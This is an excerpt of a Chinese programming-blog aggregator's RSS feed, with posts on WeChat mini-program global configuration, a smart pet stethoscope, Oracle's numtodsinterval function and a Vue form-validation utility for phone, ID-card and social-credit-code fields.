微信小程序_11_全…阅读更多...智能听诊器：宠物健康管理的得力助手随着科技的进步&amp;#xff0c;智能听诊器已经成为宠物健康管理领域的一项革命性发明。它不仅能够实时监测宠物的心跳、呼吸频率和节律等关键生理指标&amp;#xff0c;而且通过高精度的传感器捕捉到宠物心跳的微小变化和呼吸频率的微妙差异&amp;#xff0c;为宠物主人提供了实时的健康数据…阅读更多...oracle numtodsintervalOracle的numtodsinterval函数用于将数字转换为间隔值&amp;#xff08;INTERVAL&amp;#xff09;。这个函数接受一个数字和一个间隔种类作为参数&amp;#xff0c;并返回一个间隔值。 
种类参数可以是&amp;#xff1a; DAY  HOUR  MINUTE  SECOND  
下面是一些使用numtodsinterval函数的例子&amp;…阅读更多...vue中如何自定义Form表单rules校验方法（手机号/座机号、身份证号/社会统一信代码校验，支持多个，以英文逗号分隔）需求描述&amp;#xff1a; 1.相对方联系方式需要支持手机号、座机号填入保存&amp;#xff0c;可能会填写多个都需要校验是否能通过 2.相对方统一社会信用代码/身份证号码填入&amp;#xff0c;可以是身份证号码也可以是社会统一信用代码&amp;#xff0c;都得支持校验通过&amp;#xff0c;并且容许填入…阅读更多...ComfyUI绘画|文生图基础工作流搭建学好 AI绘画 不论是就业还是做副业赚钱都不错&amp;#xff0c;但要学会 AI绘画 还是要有一个学习规划。最后大家分享一份全套的 AI绘画 学习资料&amp;#xff0c;给那些想学习 AI绘画 的小伙伴们一点帮助&amp;#xff01; 
设置中文界面 
方式一 这份完整版的AI绘画全套学习资料已经上传CSD…阅读更多...AGI 之 【Dify】 之 使用 Docker 在 Windows 端本地部署 Dify 大语言模型（LLM）应用开发平台AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型&amp;#xff08;LLM&amp;#xff09;应用开发平台 目录 
AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型&amp;#xff08;LLM&amp;#xff09;应用开发平台 
一、简单介绍 
二、Docker 下载安…阅读更多...【JavaEE初阶】深入理解TCP协议中的封装分用以及UDP和TCP在网络编程的区别前言 
&amp;#x1f31f;&amp;#x1f31f;本期讲解关于TCP/UDP协议的原理理解~~~ 
&amp;#x1f308;上期博客在这里&amp;#xff1a;【JavaEE初阶】入门视角-网络原理的基础理论的了解-CSDN博客 
&amp;#x1f308;感兴趣的小伙伴看一看小编主页&amp;#xff1a;GGBondlctrl-CSDN博客 
&amp;#x1f525; …阅读更多...危化品经营单位（生产管理人员）考试试题及答案危化品经营单位&amp;#xff08;生产管理人员&amp;#xff09;考试试题及答案 
76.生产经营单位应当组织开展本单位的&amp;#xff08; &amp;#xff09;,使有关人员了解应急预案内容,熟悉应急职责、应急程序和岗位应急处置方案。 
A.应急预案培训活动 
B.应急预案编制 
C.应急预案演练 
答案:A…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:45 +0000</pubDate>
    </item>
    <item>
      <title>【微信小程序_11_全局配置】</title>
      <link>https://www.ppmy.cn/news/1540869.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维【微信小程序_11_全局配置】news/2025/10/31 23:18:44/摘要：本文介绍了微信小程序全局配置文件 app.json 中的常用配置项，重点阐述了 window 节点的各项配置，包括导航栏标题文字、背景色、标题颜色，窗口背景色、下拉刷新样式以及上拉触底距离等。通过这些配置可实现小程序窗口外观的个性化设置，提升用户体验。微信小程序_11_全局配置一、全局配置文件及常用配置项1.全局配置文件2.常用配置项：二、小程序窗口组成部分三、window 节点常用配置项1.navigationBarTitleText2.navigationBarBackgroundColor3.navigationBarTextStyle4.backgroundColor5.backgroundTextStyle6.enablePullDownRefresh7.onReachBottomDistance四、总结一、全局配置文件及常用配置项1.全局配置文件小程序根目录下的 app.json 文件是小程序的全局配置文件。2.常用配置项：pages：记录当前小程序所有页面的存放路径。window：全局设置小程序窗口的外观。tabBar：设置小程序底部的 tabBar 效果。style：是否启用新版的组件样式。二、小程序窗口组成部分小程序窗口主要由导航栏区域、背景区域（默认不可见，下拉才显示）和页面主体区域（用来显示 wxml 中的布局）组成。三、window 节点常用配置项1.navigatiohttp://www.ppmy.cn/news/1540869.html相关文章智能听诊器：宠物健康管理的得力助手随着科技的进步&amp;#xff0c;智能听诊器已经成为宠物健康管理领域的一项革命性发明。它不仅能够实时监测宠物的心跳、呼吸频率和节律等关键生理指标&amp;#xff0c;而且通过高精度的传感器捕捉到宠物心跳的微小变化和呼吸频率的微妙差异&amp;#xff0c;为宠物主人提供了实时的健康数据…阅读更多...oracle numtodsintervalOracle的numtodsinterval函数用于将数字转换为间隔值&amp;#xff08;INTERVAL&amp;#xff09;。这个函数接受一个数字和一个间隔种类作为参数&amp;#xff0c;并返回一个间隔值。 
种类参数可以是&amp;#xff1a; DAY  HOUR  MINUTE  SECOND  
下面是一些使用numtodsinterval函数的例子&amp;…阅读更多...vue中如何自定义Form表单rules校验方法（手机号/座机号、身份证号/社会统一信代码校验，支持多个，以英文逗号分隔）需求描述&amp;#xff1a; 1.相对方联系方式需要支持手机号、座机号填入保存&amp;#xff0c;可能会填写多个都需要校验是否能通过 2.相对方统一社会信用代码/身份证号码填入&amp;#xff0c;可以是身份证号码也可以是社会统一信用代码&amp;#xff0c;都得支持校验通过&amp;#xff0c;并且容许填入…阅读更多...ComfyUI绘画|文生图基础工作流搭建学好 AI绘画 不论是就业还是做副业赚钱都不错&amp;#xff0c;但要学会 AI绘画 还是要有一个学习规划。最后大家分享一份全套的 AI绘画 学习资料&amp;#xff0c;给那些想学习 AI绘画 的小伙伴们一点帮助&amp;#xff01; 
设置中文界面 
方式一 这份完整版的AI绘画全套学习资料已经上传CSD…阅读更多...AGI 之 【Dify】 之 使用 Docker 在 Windows 端本地部署 Dify 大语言模型（LLM）应用开发平台AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型&amp;#xff08;LLM&amp;#xff09;应用开发平台 目录 
AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型&amp;#xff08;LLM&amp;#xff09;应用开发平台 
一、简单介绍 
二、Docker 下载安…阅读更多...【JavaEE初阶】深入理解TCP协议中的封装分用以及UDP和TCP在网络编程的区别前言 
&amp;#x1f31f;&amp;#x1f31f;本期讲解关于TCP/UDP协议的原理理解~~~ 
&amp;#x1f308;上期博客在这里&amp;#xff1a;【JavaEE初阶】入门视角-网络原理的基础理论的了解-CSDN博客 
&amp;#x1f308;感兴趣的小伙伴看一看小编主页&amp;#xff1a;GGBondlctrl-CSDN博客 
&amp;#x1f525; …阅读更多...危化品经营单位（生产管理人员）考试试题及答案危化品经营单位&amp;#xff08;生产管理人员&amp;#xff09;考试试题及答案 
76.生产经营单位应当组织开展本单位的&amp;#xff08; &amp;#xff09;,使有关人员了解应急预案内容,熟悉应急职责、应急程序和岗位应急处置方案。 
A.应急预案培训活动 
B.应急预案编制 
C.应急预案演练 
答案:A…阅读更多...六、LogicFlow 自定义业务边 Edge前言 
经过前面的文章讲解&amp;#xff0c;目前已经实现了节点拖拽到画布中&amp;#xff0c;并且也实现了节点之间的基础连线&amp;#xff0c;到这里也算是入了门&amp;#xff0c;接下来继续探究新学习新的功能&amp;#xff0c;以满足新的需求&amp;#xff0c;那么这一章就会学习如何更改两节点之间的连…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:44 +0000</pubDate>
    </item>
    <item>
      <title>智能听诊器：宠物健康管理的得力助手</title>
      <link>https://www.ppmy.cn/news/1540868.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维智能听诊器：宠物健康管理的得力助手news/2025/10/31 23:18:43/随着科技的进步，智能听诊器已经成为宠物健康管理领域的一项革命性发明。它不仅能够实时监测宠物的心跳、呼吸频率和节律等关键生理指标，而且通过高精度的传感器捕捉到宠物心跳的微小变化和呼吸频率的微妙差异，为宠物主人提供了实时的健康数据。这些数据对于宠物医生来说至关重要，因为它们可以揭示宠物心脏和呼吸系统的健康状况。智能听诊器的另一个显著特点是其智能警报系统。当监测到宠物的生理指标超出正常范围时，系统会自动发出预警，提醒宠物主人注意。这种预警系统对于预防疾病的发生和在疾病初期进行干预具有重要意义，从而提高宠物的生活质量。此外，智能听诊器通常配备有易于理解的图表和警报系统，即使是没有医学背景的宠物主人也能轻松使用。这种智能化的健康管理方式，让宠物主人能够更加科学地照顾宠物，提高宠物的健康水平。智能听诊器的云端存储功能也为用户提供了便利。宠物的健康数据可以安全地存储在云端，这样即使宠物主人更换设备或遗失数据，也能轻松恢复宠物的健康记录。总之，智能听诊器是宠物健康管理的得力助手。它通过高精度的监测和智能警报系统，为宠物主人提供了一种新的宠物健康管理方式。随着技术的不断进步，智能听诊器将为宠物的健康带来更多的保障。http://www.ppmy.cn/news/1540868.html相关文章oracle numtodsintervalOracle的numtodsinterval函数用于将数字转换为间隔值&amp;#xff08;INTERVAL&amp;#xff09;。这个函数接受一个数字和一个间隔种类作为参数&amp;#xff0c;并返回一个间隔值。 
种类参数可以是&amp;#xff1a; DAY  HOUR  MINUTE  SECOND  
下面是一些使用numtodsinterval函数的例子&amp;…阅读更多...vue中如何自定义Form表单rules校验方法（手机号/座机号、身份证号/社会统一信代码校验，支持多个，以英文逗号分隔）需求描述&amp;#xff1a; 1.相对方联系方式需要支持手机号、座机号填入保存&amp;#xff0c;可能会填写多个都需要校验是否能通过 2.相对方统一社会信用代码/身份证号码填入&amp;#xff0c;可以是身份证号码也可以是社会统一信用代码&amp;#xff0c;都得支持校验通过&amp;#xff0c;并且容许填入…阅读更多...ComfyUI绘画|文生图基础工作流搭建学好 AI绘画 不论是就业还是做副业赚钱都不错&amp;#xff0c;但要学会 AI绘画 还是要有一个学习规划。最后大家分享一份全套的 AI绘画 学习资料&amp;#xff0c;给那些想学习 AI绘画 的小伙伴们一点帮助&amp;#xff01; 
设置中文界面 
方式一 这份完整版的AI绘画全套学习资料已经上传CSD…阅读更多...AGI 之 【Dify】 之 使用 Docker 在 Windows 端本地部署 Dify 大语言模型（LLM）应用开发平台AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型&amp;#xff08;LLM&amp;#xff09;应用开发平台 目录 
AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型&amp;#xff08;LLM&amp;#xff09;应用开发平台 
一、简单介绍 
二、Docker 下载安…阅读更多...【JavaEE初阶】深入理解TCP协议中的封装分用以及UDP和TCP在网络编程的区别前言 
&amp;#x1f31f;&amp;#x1f31f;本期讲解关于TCP/UDP协议的原理理解~~~ 
&amp;#x1f308;上期博客在这里&amp;#xff1a;【JavaEE初阶】入门视角-网络原理的基础理论的了解-CSDN博客 
&amp;#x1f308;感兴趣的小伙伴看一看小编主页&amp;#xff1a;GGBondlctrl-CSDN博客 
&amp;#x1f525; …阅读更多...危化品经营单位（生产管理人员）考试试题及答案危化品经营单位&amp;#xff08;生产管理人员&amp;#xff09;考试试题及答案 
76.生产经营单位应当组织开展本单位的&amp;#xff08; &amp;#xff09;,使有关人员了解应急预案内容,熟悉应急职责、应急程序和岗位应急处置方案。 
A.应急预案培训活动 
B.应急预案编制 
C.应急预案演练 
答案:A…阅读更多...六、LogicFlow 自定义业务边 Edge前言 
经过前面的文章讲解&amp;#xff0c;目前已经实现了节点拖拽到画布中&amp;#xff0c;并且也实现了节点之间的基础连线&amp;#xff0c;到这里也算是入了门&amp;#xff0c;接下来继续探究新学习新的功能&amp;#xff0c;以满足新的需求&amp;#xff0c;那么这一章就会学习如何更改两节点之间的连…阅读更多...Verilator——最简单、最细节上手教程目录 前言工具安装Verilator 安装GTKwave 安装 Verilator 基础用法fst格式和vcd格式的wave文件Verilator 的使用 Verilator 的进阶使用与GDB搭配与makefile搭配 Verilator 的高阶用法访问模块内部数据 前言 
此教程会以ubuntu22.04为例 从如何安装&amp;#xff0c;到如何使用 全程帮…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:43 +0000</pubDate>
    </item>
    <item>
      <title>oracle numtodsinterval</title>
      <link>https://www.ppmy.cn/news/1540867.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维oracle numtodsintervalnews/2025/10/31 23:18:42/Oracle的numtodsinterval函数用于将数字转换为间隔值（INTERVAL）。这个函数接受一个数字和一个间隔种类作为参数，并返回一个间隔值。种类参数可以是：'DAY''HOUR''MINUTE''SECOND'下面是一些使用numtodsinterval函数的例子：1.将数字转换为天的间隔：SELECT numtodsinterval(1, 'DAY') AS one_day_interval FROM dual;2.将数字转换为小时的间隔：SELECT numtodsinterval(2, 'HOUR') AS two_hours_interval FROM dual;3.将数字转换为分钟的间隔：SELECT numtodsinterval(30, 'MINUTE') AS thirty_minutes_interval FROM dual;4.将数字转换为秒的间隔：SELECT numtodsinterval(45, 'SECOND') AS forty_five_seconds_interval FROM dual;5.在日期和时间函数中使用间隔值，例如将当前日期加上一天的间隔：SELECT (SYSDATE + numtodsinterval(1, 'DAY')) AS tomorrow FROM dual;6.在INTERVAL数据类型和数字之间转换：SELECT INTERVAL '123' DAY(3) AS interval_to_number FROM dual;在这个例子中，我们定义了一个有效的天数间隔（123天），并且使用DAY(3)来指定我们想要的天数精度。这将返回一个数字表示的间隔。http://www.ppmy.cn/news/1540867.html相关文章vue中如何自定义Form表单rules校验方法（手机号/座机号、身份证号/社会统一信代码校验，支持多个，以英文逗号分隔）需求描述&amp;#xff1a; 1.相对方联系方式需要支持手机号、座机号填入保存&amp;#xff0c;可能会填写多个都需要校验是否能通过 2.相对方统一社会信用代码/身份证号码填入&amp;#xff0c;可以是身份证号码也可以是社会统一信用代码&amp;#xff0c;都得支持校验通过&amp;#xff0c;并且容许填入…阅读更多...ComfyUI绘画|文生图基础工作流搭建学好 AI绘画 不论是就业还是做副业赚钱都不错&amp;#xff0c;但要学会 AI绘画 还是要有一个学习规划。最后大家分享一份全套的 AI绘画 学习资料&amp;#xff0c;给那些想学习 AI绘画 的小伙伴们一点帮助&amp;#xff01; 
设置中文界面 
方式一 这份完整版的AI绘画全套学习资料已经上传CSD…阅读更多...AGI 之 【Dify】 之 使用 Docker 在 Windows 端本地部署 Dify 大语言模型（LLM）应用开发平台AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型&amp;#xff08;LLM&amp;#xff09;应用开发平台 目录 
AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型&amp;#xff08;LLM&amp;#xff09;应用开发平台 
一、简单介绍 
二、Docker 下载安…阅读更多...【JavaEE初阶】深入理解TCP协议中的封装分用以及UDP和TCP在网络编程的区别前言 
&amp;#x1f31f;&amp;#x1f31f;本期讲解关于TCP/UDP协议的原理理解~~~ 
&amp;#x1f308;上期博客在这里&amp;#xff1a;【JavaEE初阶】入门视角-网络原理的基础理论的了解-CSDN博客 
&amp;#x1f308;感兴趣的小伙伴看一看小编主页&amp;#xff1a;GGBondlctrl-CSDN博客 
&amp;#x1f525; …阅读更多...危化品经营单位（生产管理人员）考试试题及答案危化品经营单位&amp;#xff08;生产管理人员&amp;#xff09;考试试题及答案 
76.生产经营单位应当组织开展本单位的&amp;#xff08; &amp;#xff09;,使有关人员了解应急预案内容,熟悉应急职责、应急程序和岗位应急处置方案。 
A.应急预案培训活动 
B.应急预案编制 
C.应急预案演练 
答案:A…阅读更多...六、LogicFlow 自定义业务边 Edge前言 
经过前面的文章讲解&amp;#xff0c;目前已经实现了节点拖拽到画布中&amp;#xff0c;并且也实现了节点之间的基础连线&amp;#xff0c;到这里也算是入了门&amp;#xff0c;接下来继续探究新学习新的功能&amp;#xff0c;以满足新的需求&amp;#xff0c;那么这一章就会学习如何更改两节点之间的连…阅读更多...Verilator——最简单、最细节上手教程目录 前言工具安装Verilator 安装GTKwave 安装 Verilator 基础用法fst格式和vcd格式的wave文件Verilator 的使用 Verilator 的进阶使用与GDB搭配与makefile搭配 Verilator 的高阶用法访问模块内部数据 前言 
此教程会以ubuntu22.04为例 从如何安装&amp;#xff0c;到如何使用 全程帮…阅读更多...oracle中的exists 和not exists 用法exists &amp;#xff08;sql 返回结果集为真&amp;#xff09; not exists (sql 不返回结果集为真&amp;#xff09; exists 与 in 意思相同&amp;#xff0c;语法不同&amp;#xff0c;效率高于in not exists 与 not in 意思相同&amp;#xff0c;语法不同&amp;#xff0c;效率高于in 
基本概念&amp;#xff1a; 
se…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:42 +0000</pubDate>
    </item>
    <item>
      <title>vue中如何自定义Form表单rules校验方法（手机号/座机号、身份证号/社会统一信代码校验，支持多个，以英文逗号分隔）</title>
      <link>https://www.ppmy.cn/news/1540866.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维vue中如何自定义Form表单rules校验方法（手机号/座机号、身份证号/社会统一信代码校验，支持多个，以英文逗号分隔）news/2025/10/31 23:18:41/需求描述：1.相对方联系方式需要支持手机号、座机号填入保存，可能会填写多个都需要校验是否能通过2.相对方统一社会信用代码/身份证号码填入，可以是身份证号码也可以是社会统一信用代码，都得支持校验通过，并且容许填入多个以英文逗号分隔1.首先定义一个js文件，用来编写上方对应代码（validateFromRules.js）// 验证手机号/座机号
// isMultiple区分多个/一个 true为多个 false为一个
// isSingleType 是否只验证一种类型的证件号 默认为 false
// type 验证的证件号类型，可以是 'phone'（手机号码）、'landline'（座机号码）或 'both'（两者都验证），默认为 'both'
export function validatePhone(isMultiple = true, isSingleType = false, type = 'both') {return function (rule, value, callback) {if (!value) {callback(new Error("相对方(经办人联系电话)不能为空"));return;}const phonePattern = /^1[3|4|5|6|7|8|9][0-9]\d{8}$/;const landlinePattern = /^(\d{3,4}-)?\d{7,8}$/;if (isMultiple) {const phones = value.split(",").map((v) =&gt; v.trim());const errors = [];phones.forEach((phone) =&gt; {if (type === 'phone' &amp;&amp; !phonePattern.test(phone)) {errors.push(`值 "${phone}" 无效: 请输入正确的手机号码`);} else if (type === 'landline' &amp;&amp; !landlinePattern.test(phone)) {errors.push(`值 "${phone}" 无效: 请输入正确的座机号码`);} else if (type === 'both') {if (!phonePattern.test(phone) &amp;&amp; !landlinePattern.test(phone)) {errors.push(`值 "${phone}" 无效: 请输入正确的手机号码或座机号码`);}}});if (errors.length &gt; 0) {callback(new Error(errors.join("\n")));} else {callback();}} else {if (type === 'phone' &amp;&amp; !phonePattern.test(value)) {callback(new Error("请输入正确的手机号码"));} else if (type === 'landline' &amp;&amp; !landlinePattern.test(value)) {callback(new Error("请输入正确的座机号码"));} else if (type === 'both') {if (!phonePattern.test(value) &amp;&amp; !landlinePattern.test(value)) {callback(new Error("请输入正确的手机号码或座机号码"));} else {callback();}}}};
}// 社会统一信代码/身份证号
// isMultiple区分多个/一个 true为多个 false为一个
// isSingleType 是否只验证一种类型的证件号 默认为 false
// type 验证的证件号类型，可以是 'idCard'（身份证号）、'socialCreditCode'（统一社会信用代码）或 'both'（两者都验证），默认为 'both'
export function validateSocialId(isMultiple = true, isSingleType = false, type = 'both') {return function (rule, value, callback) {if (!value) {callback(new Error("统一社会信用代码/身份证号码不能为空！"));return;}const values = isMultiple ? value.split(",").map((v) =&gt; v.trim()) : [value];const errors = [];values.forEach((val) =&gt; {if (type === 'idCard' &amp;&amp; !isIDCard(val)) {errors.push(`值 "${val}" 无效: 不符合身份证号码的格式`);} else if (type === 'socialCreditCode' &amp;&amp; !isSocialCreditCode(val)) {errors.push(`值 "${val}" 无效: 不符合统一社会信用代码的格式`);} else if (type === 'both') {if (isIDCard(val)) {validateIDCard({}, val, (error) =&gt; {if (error) {errors.push(`值 "${val}" 无效: ${error.message}`);}});} else if (isSocialCreditCode(val)) {CheckSocialCreditCode({}, val, (error) =&gt; {if (error) {errors.push(`值 "${val}" 无效: ${error.message}`);}});} else {errors.push(`值 "${val}" 无效: 不符合统一社会信用代码或身份证号码的格式`);}}});if (errors.length &gt; 0) {callback(new Error(errors.join("\n")));} else {callback();}};
}function isSocialCreditCode(code) {return code.length === 18 &amp;&amp; /^[0-9A-Z]+$/.test(code);
}function isIDCard(idCard) {return idCard.length === 18 &amp;&amp; /^[0-9Xx]+$/.test(idCard);
}function CheckSocialCreditCode(rule, Code, callback) {if (Code.length !== 18) {callback(new Error("不是有效的统一社会信用代码！"));return;}const validChars = /^[0-9A-Z]+$/;if (!validChars.test(Code)) {callback(new Error("统一社会信用代码包含无效字符！"));return;}let total = 0;const weightedfactors = [1, 3, 9, 27, 19, 26, 16, 17, 20, 29, 25, 13, 8, 24, 10, 30, 28,];const str = "0123456789ABCDEFGHJKLMNPQRTUWXY";for (let i = 0; i &lt; Code.length - 1; i++) {const Ancodevalue = str.indexOf(Code.charAt(i));total += Ancodevalue * weightedfactors[i];}let logiccheckcode = 31 - (total % 31);if (logiccheckcode === 31) {logiccheckcode = 0;}const checkCode = str.charAt(logiccheckcode);const inputCheckCode = Code.charAt(17);if (inputCheckCode !== checkCode) {callback(new Error("不是有效的统一社会信用代码！"));} else {callback();}
}function validateIDCard(rule, idCard, callback) {if (idCard.length !== 18) {callback(new Error("不是有效的身份证号码！"));return;}const validIdCardChars = /^[0-9Xx]+$/;if (!validIdCardChars.test(idCard)) {callback(new Error("身份证号码包含无效字符！"));return;}const weightFactors = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2,];const verifyCodes = "10X98765432";let sum = 0;for (let i = 0; i &lt; 17; i++) {sum += parseInt(idCard.charAt(i), 10) * weightFactors[i];}const checkCode = verifyCodes[sum % 11];if (idCard.charAt(17).toUpperCase() !== checkCode) {callback(new Error("不是有效的身份证号码！"));} else {callback();}
}2.在main.js中引入并注册成全局方法// 验证表单rules的js文件
import {validatePhone,validateSocialId
} from './utils/validateFromRules'; // 引入封装的验证方法Vue.prototype.$validatePhone = validatePhone;
Vue.prototype.$validateSocialId  = validateSocialId ;3.在对应的vue界面中使用，方法支持传入三个参数3.1第一个参数 isMultiple 是否容许传入多个参数，true：传入多个 false：只容许有一个3.2第二个参数 isSingleType 是否只验证一种类型 默认为 false，可以选择两种都验证，比如同时填入手机号和座机号3.3第三个参数 type 验证的证件号类型，可以是 ‘phone’（手机号码）、‘landline’（座机号码）或 ‘both’（两者都验证），默认为 ‘both’rules: {partyBPhone: [{required: true,message: "相对方(经办人联系电话)不能为空",trigger: "blur",},{validator: this.$validatePhone(true, false, "both"),trigger: "blur",},],partyBSocialId: [{required: true,message: "统一社会信用代码/身份证号码不能为空",trigger: "blur",},{validator: this.$validateSocialId(true, false, "both"),trigger: "blur",},],},http://www.ppmy.cn/news/1540866.html相关文章ComfyUI绘画|文生图基础工作流搭建学好 AI绘画 不论是就业还是做副业赚钱都不错&amp;#xff0c;但要学会 AI绘画 还是要有一个学习规划。最后大家分享一份全套的 AI绘画 学习资料&amp;#xff0c;给那些想学习 AI绘画 的小伙伴们一点帮助&amp;#xff01; 
设置中文界面 
方式一 这份完整版的AI绘画全套学习资料已经上传CSD…阅读更多...AGI 之 【Dify】 之 使用 Docker 在 Windows 端本地部署 Dify 大语言模型（LLM）应用开发平台AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型&amp;#xff08;LLM&amp;#xff09;应用开发平台 目录 
AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型&amp;#xff08;LLM&amp;#xff09;应用开发平台 
一、简单介绍 
二、Docker 下载安…阅读更多...【JavaEE初阶】深入理解TCP协议中的封装分用以及UDP和TCP在网络编程的区别前言 
&amp;#x1f31f;&amp;#x1f31f;本期讲解关于TCP/UDP协议的原理理解~~~ 
&amp;#x1f308;上期博客在这里&amp;#xff1a;【JavaEE初阶】入门视角-网络原理的基础理论的了解-CSDN博客 
&amp;#x1f308;感兴趣的小伙伴看一看小编主页&amp;#xff1a;GGBondlctrl-CSDN博客 
&amp;#x1f525; …阅读更多...危化品经营单位（生产管理人员）考试试题及答案危化品经营单位&amp;#xff08;生产管理人员&amp;#xff09;考试试题及答案 
76.生产经营单位应当组织开展本单位的&amp;#xff08; &amp;#xff09;,使有关人员了解应急预案内容,熟悉应急职责、应急程序和岗位应急处置方案。 
A.应急预案培训活动 
B.应急预案编制 
C.应急预案演练 
答案:A…阅读更多...六、LogicFlow 自定义业务边 Edge前言 
经过前面的文章讲解&amp;#xff0c;目前已经实现了节点拖拽到画布中&amp;#xff0c;并且也实现了节点之间的基础连线&amp;#xff0c;到这里也算是入了门&amp;#xff0c;接下来继续探究新学习新的功能&amp;#xff0c;以满足新的需求&amp;#xff0c;那么这一章就会学习如何更改两节点之间的连…阅读更多...Verilator——最简单、最细节上手教程目录 前言工具安装Verilator 安装GTKwave 安装 Verilator 基础用法fst格式和vcd格式的wave文件Verilator 的使用 Verilator 的进阶使用与GDB搭配与makefile搭配 Verilator 的高阶用法访问模块内部数据 前言 
此教程会以ubuntu22.04为例 从如何安装&amp;#xff0c;到如何使用 全程帮…阅读更多...oracle中的exists 和not exists 用法exists &amp;#xff08;sql 返回结果集为真&amp;#xff09; not exists (sql 不返回结果集为真&amp;#xff09; exists 与 in 意思相同&amp;#xff0c;语法不同&amp;#xff0c;效率高于in not exists 与 not in 意思相同&amp;#xff0c;语法不同&amp;#xff0c;效率高于in 
基本概念&amp;#xff1a; 
se…阅读更多...WPF入门_03路由事件１、如何定义路由事件 
